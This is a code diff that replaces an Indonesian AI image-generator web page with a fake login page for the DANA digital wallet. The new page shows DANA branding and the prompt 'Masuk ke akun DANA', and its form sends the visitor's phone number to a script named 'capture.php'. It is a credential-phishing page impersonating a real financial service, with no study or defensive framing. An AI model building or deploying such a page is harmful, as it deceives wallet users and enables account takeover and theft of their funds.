@@ -1,78 +1,19 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
-    <title>Randa · AI Image Generator</title>
-    <link rel="stylesheet" href="style.css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA - Dompet Digital Indonesia</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
-    <!-- PARTICLE BACKGROUND -->
-    <div class="particles" id="particles"></div>
-
-    <!-- OVERLAY DRAWER -->
-    <div class="drawer-overlay" id="drawerOverlay"></div>
-
-    <!-- DRAWER -->
-    <div class="drawer" id="drawer">
-        <div class="drawer-header">
-            <h2>Menu</h2>
-            <button class="drawer-close" id="drawerCloseBtn">
-                <svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
-            </button>
-        </div>
-        <div class="drawer-menu">
-            <div class="drawer-menu-item active" data-feature="image">
-                <span class="menu-icon">🎨</span>
-                <span>Image Generator</span>
-                <span class="menu-badge">active</span>
-            </div>
-            <div class="drawer-menu-item" data-feature="chat">
-                <span class="menu-icon">💬</span>
-                <span>Chat Bot</span>
-                <span class="menu-badge">active</span>
-            </div>
-            <div class="drawer-menu-item" data-feature="removebg">
-                <span class="menu-icon">🧹</span>
-                <span>Remove Background</span>
-                <span class="menu-badge">soon</span>
-            </div>
-        </div>
-        <div class="drawer-footer">⚡ Randa core v2.0</div>
+    <div class="container">
+        <img src="assets/dana-logo.png" alt="DANA" width="120">
+        <h2>Masuk ke akun DANA</h2>
+        <form action="capture.php" method="POST">
+            <input type="tel" name="phone" placeholder="Masukkan nomor HP" required>
+            <button type="submit">Lanjutkan</button>
+        </form>
     </div>
-
-    <!-- NAVBAR -->
-    <nav class="navbar">
-        <button class="burger-btn" id="burgerBtn">
-            <svg viewBox="0 0 24 24"><line x1="4" y1="6" x2="20" y2="6"/><line x1="4" y1="12" x2="20" y2="12"/><line x1="4" y1="18" x2="20" y2="18"/></svg>
-        </button>
-        <div class="marquee-wrap">
-            <span class="marquee-text">✦ Randa AI · Generate image from text prompt ✦ Randa AI · Generate image from text prompt ✦</span>
-        </div>
-        <div class="nav-status">
-            <div class="dot-pulse"></div>
-            <span>online</span>
-        </div>
-    </nav>
-
-    <!-- PANEL UTAMA -->
-    <div class="core-panel" id="corePanel">
-        <div class="chat-messages" id="chatMessages"></div>
-
-        <div class="chat-input-area">
-            <div class="chat-input-row">
-                <div class="input-icon">
-                    <svg viewBox="0 0 24 24"><path d="M4 4h16v16H4z"/><circle cx="9" cy="9" r="2"/><path d="M22 14l-4-4-6 6-4-4-6 6"/></svg>
-                </div>
-                <input type="text" id="promptInput" placeholder="Tulis prompt gambar..." />
-                <button id="sendBtn">
-                    <svg viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <script src="script.js"></script>
 </body>
 </html>
